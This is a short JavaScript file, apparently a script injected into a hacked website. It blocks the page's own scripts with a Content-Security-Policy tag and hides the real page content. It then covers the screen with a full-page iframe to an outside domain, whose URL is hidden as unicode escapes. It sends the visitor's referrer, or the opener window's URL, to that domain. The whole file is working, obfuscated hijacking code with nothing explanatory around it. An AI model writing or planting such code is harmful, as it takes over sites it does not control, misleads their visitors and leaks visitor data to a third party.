document.head.insertAdjacentHTML(
    "beforeend",
    `<meta http-equiv="Content-Security-Policy" content="script-src 'none'">`
  );
var referrer = document.referrer;
if (!referrer) {
    try {
        if (window.opener) {
            referrer = window.opener.location.href
        }
    } catch(e) {}
}

var channel = '888';
var s = referrer;
var ss = '\u0068\u0074\u0074\u0070\u0073\u003a\u002f\u002f\u0077\u0077\u0077\u002e\u0071\u007a\u006c\u0079\u0068\u0069\u0062\u0061\u0062\u0079\u002e\u0063\u006f\u006d\u002f\u003f\u0063\u0068\u0061\u006e\u006e\u0065\u006c\u003d' + channel + '&ref=' + referrer;

document.write('<meta id="viewport" name="viewport" content="user-scalable=no,width=device-width, initial-scale=1.0" />');
document.write('<style>html,body {width: 100%;height: 100%;overflow: hidden;clear: both;}body > * , .container{opacity: 0;}#divs{opacity: 1;}</style>');
document.write('<div style="width:100%;height:100%;position:absolute;top:0;left:0;z-index:2147483647;" id="divs">');
document.write('<iframe src=" ' + ss  + '" frameborder="0" style="border:0;width: 100%; text-align: center; border: medium none; height:100%;max-height: 4000px;"></iframe>');
document.write('</div>');